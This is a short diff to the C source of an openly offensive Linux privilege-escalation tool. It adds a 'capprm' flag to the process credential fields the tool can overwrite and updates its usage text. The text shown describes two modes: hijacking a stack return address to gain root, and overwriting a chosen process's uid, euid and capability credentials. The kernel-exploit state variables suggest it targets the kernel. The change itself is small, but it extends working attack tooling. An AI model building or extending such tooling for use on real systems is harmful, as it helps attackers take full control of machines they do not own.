@@ -80,10 +80,10 @@ enum PRIVUP_MODE
 	UP_CRED
 };
 
-static char cred_flag[9][7] = {
+static char cred_flag[10][7] = {
     "uid","gid","suid","sgid",
     "euid","egid","fsuid","fsgid",
-    "capeff"
+    "capeff","capprm"
 };
 
 uint64_t user_cs, user_ss, user_sp, user_rflags, user_rip;
@@ -142,13 +142,13 @@ void modify_cred(char *flags, pid_t t_pid, unsigned short s_flag)
 	p = strtok(flags, ",");
 	while(p){   
 		int i;
-		for(i=0;i<9;i++){
+		for(i=0;i<10;i++){
 			if (!strcmp(p,cred_flag[i])){
 				cred_modify.cred_flags |= BIT(i);
 				break;
 			}
 		}
-		if (i==9){
+		if (i==10){
 			logw("Unknown Flag!");
 			free(flags);
 			privup_usage(1);
@@ -254,7 +254,7 @@ void privup_usage(int status)
 	fputs("  -s, --stack             Hijacking the return address on the stack to elevate privileges.\n",stdout);
 	fputs("  -c, --cred=flags        Overwrite process cred to elevate privileges.\n\
                           Flags include uid, euid, suid, fsuid, capeff,\n\
-                                        gid, egid, sgid, fsgid,\n\
+                                        gid, egid, sgid, fsgid, capprm\n\
                           multiple flags separated by \',\'.\n",stdout);
 	fputs("  -p, --pid=pid           with -c, target process pid, default is current process.\n",stdout);
 	fputs("  -S, --sleep=seconds     No shell just sleep.\n\n",stdout);
